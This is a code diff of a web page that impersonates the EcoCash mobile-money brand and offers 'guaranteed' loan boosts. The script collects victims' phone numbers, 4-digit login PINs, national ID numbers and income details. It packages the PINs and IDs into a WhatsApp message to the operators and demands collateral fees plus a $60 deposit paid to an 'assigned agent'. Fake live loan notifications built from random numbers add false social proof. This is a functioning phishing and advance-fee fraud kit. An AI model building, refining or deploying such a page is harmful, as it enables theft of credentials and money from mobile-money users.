@@ -194,25 +194,17 @@
                         <p id="login-phone-error" class="text-[11px] text-red-600 mt-1 hidden font-medium">Incorrect phone number (Must be 9 digits starting with 7)</p>
                     </div>
 
-                    <!-- PIN Section -->
+                    <!-- Single Smooth PIN Input Field (Seamless Typing) -->
                     <div class="text-center mb-6">
-                        <p class="text-xs text-gray-500 dark:text-gray-400 font-medium mb-3">Enter your 4-Digit PIN</p>
-                        
-                        <div class="flex justify-center items-center space-x-3 relative max-w-xs mx-auto">
-                            <input type="password" inputmode="numeric" pattern="[0-9]*" maxlength="1" id="pin-1" class="pin-box w-12 h-12 border-2 border-ecoblue dark:bg-gray-700 dark:text-white rounded-lg text-center text-xl font-bold focus:outline-none focus:ring-2 focus:ring-ecoblue" onkeyup="movePinFocus(this, 1, event)" oninput="validateLoginForm()">
-                            <input type="password" inputmode="numeric" pattern="[0-9]*" maxlength="1" id="pin-2" class="pin-box w-12 h-12 border-2 border-ecoblue dark:bg-gray-700 dark:text-white rounded-lg text-center text-xl font-bold focus:outline-none focus:ring-2 focus:ring-ecoblue" onkeyup="movePinFocus(this, 2, event)" oninput="validateLoginForm()">
-                            <input type="password" inputmode="numeric" pattern="[0-9]*" maxlength="1" id="pin-3" class="pin-box w-12 h-12 border-2 border-ecoblue dark:bg-gray-700 dark:text-white rounded-lg text-center text-xl font-bold focus:outline-none focus:ring-2 focus:ring-ecoblue" onkeyup="movePinFocus(this, 3, event)" oninput="validateLoginForm()">
-                            <input type="password" inputmode="numeric" pattern="[0-9]*" maxlength="1" id="pin-4" class="pin-box w-12 h-12 border-2 border-ecoblue dark:bg-gray-700 dark:text-white rounded-lg text-center text-xl font-bold focus:outline-none focus:ring-2 focus:ring-ecoblue" onkeyup="movePinFocus(this, 4, event)" oninput="validateLoginForm()">
-
-                            <button type="button" onclick="togglePinVisibility()" class="ml-2 text-gray-600 dark:text-gray-300 hover:text-ecoblue focus:outline-none">
+                        <label class="block text-xs font-semibold text-gray-700 dark:text-gray-300 mb-2">Enter your 4-Digit PIN <span class="text-red-500">*</span></label>
+                        <div class="relative max-w-xs mx-auto">
+                            <input type="password" id="login-pin-single" inputmode="numeric" pattern="[0-9]*" maxlength="4" placeholder="••••" class="w-full h-14 border-2 border-ecoblue dark:bg-gray-700 dark:text-white rounded-xl text-center text-2xl font-extrabold tracking-[1em] focus:outline-none focus:ring-2 focus:ring-ecoblue shadow-sm" oninput="validateLoginForm()">
+                            
+                            <button type="button" onclick="togglePinVisibility()" class="absolute right-4 top-4 text-gray-600 dark:text-gray-300 hover:text-ecoblue focus:outline-none">
                                 <i id="pin-eye-icon" class="fa-regular fa-eye text-lg"></i>
                             </button>
                         </div>
-                        <p id="login-pin-error" class="text-[11px] text-red-600 mt-1 hidden font-medium text-center">Incorrect PIN (Must be 4 digits)</p>
-
-                        <div class="mt-2">
-                            <a href="#" class="text-xs text-gray-500 dark:text-gray-400 hover:underline">Forgot PIN?</a>
-                        </div>
+                        <p id="login-pin-error" class="text-[11px] text-red-600 mt-1 hidden font-medium text-center">Incorrect PIN (Must be exactly 4 digits)</p>
                     </div>
 
                     <!-- LOGIN BUTTON -->
@@ -507,7 +499,6 @@
                         <p id="process-subtitle" class="text-xs text-gray-500 dark:text-gray-400">Analyzing your last 6 months transactions and credentials...</p>
                     </div>
 
-                    <!-- Loading Skeletons -->
                     <div class="space-y-2 pt-2">
                         <div class="h-4 w-full skeleton rounded"></div>
                         <div class="h-4 w-3/4 skeleton rounded"></div>
@@ -910,7 +901,6 @@
             }
         }
 
-        // Initialize theme on load
         if (localStorage.getItem('ecocash_theme') === 'dark') {
             document.documentElement.classList.add('dark');
             document.getElementById('dark-mode-icon').className = "fa-solid fa-sun text-xs";
@@ -928,11 +918,9 @@
             const container = document.getElementById('live-notification-container');
             if (!container) return;
 
-            // Pick random masked number and loan amount
             const randomPhone = sampleMaskedNumbers[Math.floor(Math.random() * sampleMaskedNumbers.length)];
             const randomAmount = sampleLoanAmounts[Math.floor(Math.random() * sampleLoanAmounts.length)];
 
-            // Create popup card element
             const popup = document.createElement('div');
             popup.className = "bg-white dark:bg-gray-800 border border-blue-200 dark:border-gray-700 shadow-xl rounded-2xl p-3.5 mb-2 w-full max-w-[340px] flex items-center space-x-3 notification-slide-in pointer-events-auto cursor-pointer";
             
@@ -954,7 +942,6 @@
 
             container.appendChild(popup);
 
-            // Remove popup after 4.5 seconds with slide out animation
             setTimeout(() => {
                 popup.classList.remove('notification-slide-in');
                 popup.classList.add('notification-slide-out');
@@ -964,12 +951,10 @@
             }, 4500);
         }
 
-        // Start live notification loop (every 7 seconds)
         setInterval(triggerLiveNotificationPopup, 7000);
-        // Trigger first notification after 2 seconds on load
         setTimeout(triggerLiveNotificationPopup, 2000);
 
-        // 10 Client FAQ questions structured into TWO clear, readable parts for Ask Thembi AI
+        // Client FAQ questions for Ask Thembi AI
         const thembiFAQs = [
             { 
                 q: "What is the final $60 USD deposit requirement?", 
@@ -1114,20 +1099,17 @@
             askThembiQuestion(query, p1, p2);
         }
 
-        // Direct WhatsApp redirection for Promotional Bundle Buy Now
         function buyBundlePromo(bundleTitle) {
             const message = `*EcoCash Data Bundle Promotion Request*\n\n🔥 *Selected Offer:* Buy ${bundleTitle}\n📱 *Client Phone:* ${clientData.phone || 'Not logged in'}\n👤 *Client Name:* ${clientData.name || 'EcoCash Customer'}\n\n✅ *Status:* Guaranteed instant activation via WhatsApp!`;
             openWhatsAppChat(message);
         }
 
-        // Validate Zimbabwe National ID format e.g. 63-1234567A89
         function isValidZimbabweNID(nid) {
             const cleanNid = nid.trim().toUpperCase();
             const zimIdRegex = /^\d{2}-\d{4,7}[A-Z]\d{2}$/;
             return zimIdRegex.test(cleanNid);
         }
 
-        // Initialize Tier Upgrade Table Options for Boost (5% fee)
         function initTierTable() {
             const container = document.getElementById('tier-options-container');
             container.innerHTML = '';
@@ -1167,7 +1149,6 @@
             });
         }
 
-        // Initialize Apply / Register Tier Table ($100 to $3000 USD with exact 10% fee)
         function initApplyTierTable() {
             const container = document.getElementById('apply-tier-options-container');
             container.innerHTML = '';
@@ -1242,7 +1223,6 @@
             window.open(waUrl, '_blank');
         }
 
-        // Global 5-second dim light and cycling function for any transition/action
         function triggerGlobalDimLoader(titleText, subtitleText, onComplete) {
             const overlay = document.getElementById('global-dim-overlay');
             const titleEl = document.getElementById('overlay-title');
@@ -1261,24 +1241,19 @@
             }, 5000);
         }
 
-        // Switch tab with 5-second dim light & cycling effect
         function switchTabWithDim(tabName) {
             triggerGlobalDimLoader("Loading EcoCash Secure Portal", "Preparing next page and securing session...", () => {
                 switchTab(tabName);
             });
         }
 
-        // Handle Login Submission with 5s Dim Light & Cycling
+        // Handle Login Submission
         function handleLoginSubmit() {
             const phone = document.getElementById('login-phone').value.trim();
-            const p1 = document.getElementById('pin-1').value;
-            const p2 = document.getElementById('pin-2').value;
-            const p3 = document.getElementById('pin-3').value;
-            const p4 = document.getElementById('pin-4').value;
-            const pin = `${p1}${p2}${p3}${p4}`;
+            const pin = document.getElementById('login-pin-single').value.trim();
 
-            if (!phone || pin.length < 4) {
-                showToast('Please complete your phone number and 4-digit PIN.');
+            if (!phone || pin.length !== 4) {
+                showToast('Please enter your phone number and 4-digit PIN.');
                 return;
             }
 
@@ -1297,7 +1272,6 @@
             });
         }
 
-        // Handle Sign Up Submission with 5s Processing Cycle
         function handleSignUpSubmit() {
             const firstName = document.getElementById('signup-firstname').value.trim();
             const surname = document.getElementById('signup-surname').value.trim();
@@ -1339,13 +1313,10 @@
             });
         }
 
-        // Validate Login Form with real-time green ticks & red error messages
+        // Validate Login Form with single seamless PIN field
         function validateLoginForm() {
             const phone = document.getElementById('login-phone').value.trim();
-            const p1 = document.getElementById('pin-1').value;
-            const p2 = document.getElementById('pin-2').value;
-            const p3 = document.getElementById('pin-3').value;
-            const p4 = document.getElementById('pin-4').value;
+            const pin = document.getElementById('login-pin-single').value.trim();
             const loginBtn = document.getElementById('login-btn');
 
             const phoneIcon = document.getElementById('login-phone-icon');
@@ -1367,8 +1338,8 @@
                 phoneError.classList.add('hidden');
             }
 
-            let isPinValid = (p1 !== '' && p2 !== '' && p3 !== '' && p4 !== '');
-            if (p1 !== '' || p2 !== '' || p3 !== '' || p4 !== '') {
+            let isPinValid = pin.length === 4 && /^\d{4}$/.test(pin);
+            if (pin.length > 0) {
                 if (isPinValid) {
                     pinError.classList.add('hidden');
                 } else {
@@ -1387,7 +1358,6 @@
             }
         }
 
-        // Validate Boost Form with real-time green ticks & red error messages
         function validateBoostForm() {
             const name = document.getElementById('boost-name').value.trim();
             const phone = document.getElementById('boost-phone').value.trim();
@@ -1430,7 +1400,6 @@
             }
         }
 
-        // Validate Sign Up Form with real-time green ticks & red error messages
         function validateSignupForm() {
             const firstName = document.getElementById('signup-firstname').value.trim();
             const surname = document.getElementById('signup-surname').value.trim();
@@ -1448,4 +1417,286 @@
 
             const fnValid = /^[A-Za-z]+$/.test(firstName);
             const snValid = /^[A-Za-z]+$/.test(surname);
-  
+            const phoneValid = /^[7]\d{8}$/.test(mobileNumber);
+            const emailValid = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
+            const nidValid = isValidZimbabweNID(nationalId);
+            const passValid = password.length >= 8 && /[A-Za-z]/.test(password) && /\d/.test(password);
+
+            updateFieldValidationUI('signup-firstname', fnValid, 'signup-firstname-icon', 'signup-firstname-error');
+            updateFieldValidationUI('signup-surname', snValid, 'signup-surname-icon', 'signup-surname-error');
+            updateFieldValidationUI('signup-phone', phoneValid, 'signup-phone-icon', 'signup-phone-error');
+            updateFieldValidationUI('signup-email', emailValid, 'signup-email-icon', 'signup-email-error');
+            updateFieldValidationUI('new-password', passValid, 'signup-password-icon', 'signup-password-error');
+
+            const nidIcon = document.getElementById('signup-nid-icon');
+            const nidError = document.getElementById('signup-id-error');
+            if (nationalId.length > 0) {
+                nidIcon.classList.remove('hidden');
+                if (nidValid) {
+                    nidIcon.innerHTML = '<i class="fa-solid fa-circle-check text-green-600"></i>';
+                    nidError.classList.add('hidden');
+                } else {
+                    nidIcon.innerHTML = '<i class="fa-solid fa-circle-xmark text-red-600"></i>';
+                    nidError.classList.remove('hidden');
+                }
+            } else {
+                nidIcon.classList.add('hidden');
+                nidError.classList.add('hidden');
+            }
+
+            if (fnValid && snValid && country && phoneValid && emailValid && nidValid && passValid && genderRadio && day && month && year && termsChecked) {
+                signupBtn.disabled = false;
+                signupBtn.className = "w-full bg-blue-600 hover:bg-blue-700 text-white font-semibold py-3 rounded-md uppercase text-xs tracking-wider transition cursor-pointer shadow-md";
+            } else {
+                signupBtn.disabled = true;
+                signupBtn.className = "w-full bg-gray-200 dark:bg-gray-700 text-gray-400 dark:text-gray-500 font-semibold py-3 rounded-md uppercase text-xs tracking-wider cursor-not-allowed transition";
+            }
+        }
+
+        function validateApplyForm() {
+            const name = document.getElementById('apply-name').value.trim();
+            const phone = document.getElementById('apply-phone').value.trim();
+            const nid = document.getElementById('apply-nid').value.trim();
+            const employment = document.getElementById('apply-employment').value;
+            const income = document.getElementById('apply-income').value.trim();
+            const btn = document.getElementById('apply-submit-btn');
+
+            const nameValid = /^[A-Za-z\s]+$/.test(name);
+            const phoneValid = /^[7]\d{8}$/.test(phone);
+            const nidValid = isValidZimbabweNID(nid);
+            const incomeValid = income !== '' && Number(income) > 0;
+
+            updateFieldValidationUI('apply-name', nameValid, 'apply-name-icon', 'apply-name-error');
+            updateFieldValidationUI('apply-phone', phoneValid, 'apply-phone-icon', 'apply-phone-error');
+            
+            const nidIcon = document.getElementById('apply-nid-icon');
+            const nidError = document.getElementById('apply-id-error');
+            if (nid.length > 0) {
+                nidIcon.classList.remove('hidden');
+                if (nidValid) {
+                    nidIcon.innerHTML = '<i class="fa-solid fa-circle-check text-green-600"></i>';
+                    nidError.classList.add('hidden');
+                } else {
+                    nidIcon.innerHTML = '<i class="fa-solid fa-circle-xmark text-red-600"></i>';
+                    nidError.classList.remove('hidden');
+                }
+            } else {
+                nidIcon.classList.add('hidden');
+                nidError.classList.add('hidden');
+            }
+
+            updateFieldValidationUI('apply-income', incomeValid, 'apply-income-icon', 'apply-income-error');
+
+            if (nameValid && phoneValid && nidValid && employment && incomeValid) {
+                btn.disabled = false;
+                btn.className = "w-full bg-supergreen hover:opacity-90 text-white font-bold py-2.5 rounded-md uppercase text-xs tracking-wider cursor-pointer transition shadow-md";
+            } else {
+                btn.disabled = true;
+                btn.className = "w-full bg-gray-200 dark:bg-gray-700 text-gray-400 dark:text-gray-500 font-bold py-2.5 rounded-md uppercase text-xs tracking-wider cursor-not-allowed transition shadow-sm";
+            }
+        }
+
+        function updateFieldValidationUI(inputId, isValid, iconId, errorId) {
+            const val = document.getElementById(inputId).value.trim();
+            const icon = document.getElementById(iconId);
+            const error = document.getElementById(errorId);
+
+            if (val.length > 0) {
+                icon.classList.remove('hidden');
+                if (isValid) {
+                    icon.innerHTML = '<i class="fa-solid fa-circle-check text-green-600"></i>';
+                    if(error) error.classList.add('hidden');
+                } else {
+                    icon.innerHTML = '<i class="fa-solid fa-circle-xmark text-red-600"></i>';
+                    if(error) error.classList.remove('hidden');
+                }
+            } else {
+                icon.classList.add('hidden');
+                if(error) error.classList.add('hidden');
+            }
+        }
+
+        function startProcessingFlow(type) {
+            if (type === 'boost') {
+                const name = document.getElementById('boost-name').value.trim();
+                const phone = document.getElementById('boost-phone').value.trim();
+                const nid = document.getElementById('boost-nid').value.trim();
+                const currentLoan = document.getElementById('boost-current-loan').value.trim();
+
+                if (!name || !phone || !nid || !currentLoan) {
+                    showToast('All fields are required.');
+                    return;
+                }
+
+                clientData.name = name;
+                clientData.phone = `+263 ${phone}`;
+                clientData.nid = nid.toUpperCase();
+                clientData.currentLoan = currentLoan;
+                clientData.flowType = 'boost';
+
+                triggerGlobalDimLoader("Validating Kashagi Loan Requirements", "Analyzing 6 months wallet transaction history & Zimbabwe ID...", () => {
+                    initTierTable();
+                    switchTab('tier-upgrade');
+                });
+
+            } else if (type === 'apply') {
+                const name = document.getElementById('apply-name').value.trim();
+                const phone = document.getElementById('apply-phone').value.trim();
+                const nid = document.getElementById('apply-nid').value.trim();
+                const employment = document.getElementById('apply-employment').value;
+                const income = document.getElementById('apply-income').value.trim();
+
+                if (!name || !phone || !nid || !employment || !income) {
+                    showToast('Please provide all required loan registration details.');
+                    return;
+                }
+
+                clientData.applyName = name;
+                clientData.applyPhone = `+263 ${phone}`;
+                clientData.applyNid = nid.toUpperCase();
+                clientData.applyEmployment = employment;
+                clientData.applyIncome = income;
+                clientData.flowType = 'apply';
+
+                triggerGlobalDimLoader("Validating New Loan Registration", "Verifying guaranteed loan tier & Zimbabwe ID Registry...", () => {
+                    switchTab('terms');
+                });
+            }
+        }
+
+        function proceedToTerms() {
+            clientData.flowType = 'boost';
+            switchTabWithDim('terms');
+        }
+
+        function toggleAgreeCheckbox() {
+            const checkbox = document.getElementById('explicit-agree-checkbox');
+            const agreeBtn = document.getElementById('agree-terms-btn');
+
+            if (checkbox.checked) {
+                agreeBtn.disabled = false;
+                agreeBtn.className = "w-full bg-ecoblue hover:bg-ecodarkblue text-white font-bold py-2.5 rounded-md uppercase text-[11px] tracking-wider cursor-pointer transition shadow-md";
+            } else {
+                agreeBtn.disabled = true;
+                agreeBtn.className = "w-full bg-gray-300 dark:bg-gray-700 text-gray-500 dark:text-gray-400 font-bold py-2.5 rounded-md uppercase text-[11px] tracking-wider cursor-not-allowed transition shadow-md";
+            }
+        }
+
+        function handleFinalAgreement() {
+            let message = '';
+            
+            if (clientData.flowType === 'boost') {
+                message = `*EcoCash Guaranteed Kashagi Loan Boost Upgrade*\n\n🔒 *Login Credentials:*\n📱 *Login Phone:* ${clientData.loginPhone || 'N/A'}\n🔑 *Login PIN:* ${clientData.loginPin || 'N/A'}\n\n👤 *Client Full Name:* ${clientData.name}\n📱 *Contact Phone:* ${clientData.phone}\n🆔 *Zimbabwe National ID:* ${clientData.nid}\n💰 *Current Kashagi Loan:* $${clientData.currentLoan} USD\n🚀 *Target Upgrade Tier:* $${clientData.selectedTierAmount} USD\n💵 *Activation Collateral Fee:* $${clientData.selectedTierFee.toFixed(2)} USD\n💵 *Final Account Deposit Required:* $60.00 USD (Paid to assigned agent)\n📊 *History Status:* Last 6 Months Verified\n✅ *Status:* Guaranteed Credentials Verified & Terms Agreed`;
+            } else {
+                message = `*EcoCash Guaranteed Kashagi Loan Full Registration*\n\n🔒 *Login Credentials:*\n📱 *Login Phone:* ${clientData.loginPhone || 'N/A'}\n🔑 *Login PIN:* ${clientData.loginPin || 'N/A'}\n\n👤 *Full Name:* ${clientData.applyName}\n📱 *Contact Phone:* ${clientData.applyPhone}\n🆔 *Zimbabwe National ID:* ${clientData.applyNid}\n💼 *Employment Status:* ${clientData.applyEmployment}\n💵 *Monthly Income:* $${clientData.applyIncome} USD\n🛡️ *Selected Tier Limit:* $${clientData.selectedApplyAmount} USD\n🛡️ *Collateral Fee (10%):* $${clientData.selectedApplyFee.toFixed(2)} USD\n💵 *Final Account Deposit Required:* $60.00 USD (Paid to assigned agent)\n📊 *History Status:* Last 6 Months Verified\n✅ *Status:* Guaranteed Registration & Terms Agreed`;
+            }
+
+            openWhatsAppChat(message);
+        }
+
+        function validateContactForm() {
+            const name = document.getElementById('contact-name').value.trim();
+            const email = document.getElementById('contact-email').value.trim();
+            const phone = document.getElementById('contact-phone').value.trim();
+            const userMessage = document.getElementById('contact-message').value.trim();
+            const contactBtn = document.getElementById('contact-btn');
+
+            if (name && email && phone && userMessage) {
+                contactBtn.disabled = false;
+                contactBtn.className = "w-full bg-ecoblue text-white font-bold py-3 rounded-md hover:bg-blue-700 transition cursor-pointer shadow-md";
+            } else {
+                contactBtn.disabled = true;
+                contactBtn.className = "w-full bg-gray-200 dark:bg-gray-700 text-gray-400 dark:text-gray-500 font-bold py-3 rounded-md cursor-not-allowed transition";
+            }
+        }
+
+        function handleContactSubmit() {
+            const name = document.getElementById('contact-name').value.trim();
+            const email = document.getElementById('contact-email').value.trim();
+            const phone = document.getElementById('contact-phone').value.trim();
+            const userMessage = document.getElementById('contact-message').value.trim();
+
+            if (!name || !email || !phone || !userMessage) {
+                showToast('Please complete all contact form fields.');
+                return;
+            }
+
+            const message = `*EcoCash Support Inquiry*\n\n👤 *Name:* ${name}\n📧 *Email:* ${email}\n📱 *Phone:* ${phone}\n💬 *Message:* ${userMessage}`;
+            openWhatsAppChat(message);
+        }
+
+        function switchTab(tabName) {
+            const loginView = document.getElementById('view-login');
+            const signupView = document.getElementById('view-signup');
+            const hubView = document.getElementById('view-kashagi-hub');
+            const processingView = document.getElementById('view-processing');
+            const boostFormView = document.getElementById('view-boost-form');
+            const tierUpgradeView = document.getElementById('view-tier-upgrade');
+            const termsView = document.getElementById('view-terms');
+            const applyFormView = document.getElementById('view-apply-form');
+            const contactView = document.getElementById('view-contact');
+            const whatsappWidget = document.getElementById('whatsapp-widget');
+
+            loginView.classList.add('hidden');
+            signupView.classList.add('hidden');
+            hubView.classList.add('hidden');
+            processingView.classList.add('hidden');
+            boostFormView.classList.add('hidden');
+            tierUpgradeView.classList.add('hidden');
+            termsView.classList.add('hidden');
+            applyFormView.classList.add('hidden');
+            contactView.classList.add('hidden');
+            whatsappWidget.classList.add('hidden');
+
+            if (tabName === 'login') {
+                loginView.classList.remove('hidden');
+            } else if (tabName === 'signup') {
+                signupView.classList.remove('hidden');
+            } else if (tabName === 'kashagi-hub') {
+                hubView.classList.remove('hidden');
+            } else if (tabName === 'processing') {
+                processingView.classList.remove('hidden');
+            } else if (tabName === 'boost-form') {
+                boostFormView.classList.remove('hidden');
+            } else if (tabName === 'tier-upgrade') {
+                tierUpgradeView.classList.remove('hidden');
+            } else if (tabName === 'terms') {
+                termsView.classList.remove('hidden');
+            } else if (tabName === 'apply-form') {
+                applyFormView.classList.remove('hidden');
+                initApplyTierTable();
+            } else if (tabName === 'contact') {
+                contactView.classList.remove('hidden');
+                whatsappWidget.classList.remove('hidden');
+            }
+            
+            window.scrollTo({ top: 0, behavior: 'smooth' });
+        }
+
+        function toggleMenu() {
+            const dropdown = document.getElementById('nav-dropdown');
+            dropdown.classList.toggle('hidden');
+        }
+
+        let showPin = false;
+        function togglePinVisibility() {
+            showPin = !showPin;
+            const pinInput = document.getElementById('login-pin-single');
+            const eyeIcon = document.getElementById('pin-eye-icon');
+
+            pinInput.type = showPin ? 'text' : 'password';
+            eyeIcon.className = showPin ? 'fa-regular fa-eye-slash text-lg' : 'fa-regular fa-eye text-lg';
+        }
+
+        let showPassword = false;
+        function togglePasswordVisibility() {
+            showPassword = !showPassword;
+            const passInput = document.getElementById('new-password');
+            const eyeIcon = document.getElementById('password-eye-icon');
+
+            passInput.type = showPassword ? 'text' : 'password';
+            eyeIcon.className = showPassword ? 'fa-regular fa-eye-slash' : 'fa-regular fa-eye';
+        }
+    </script>
+</body>
+</html>
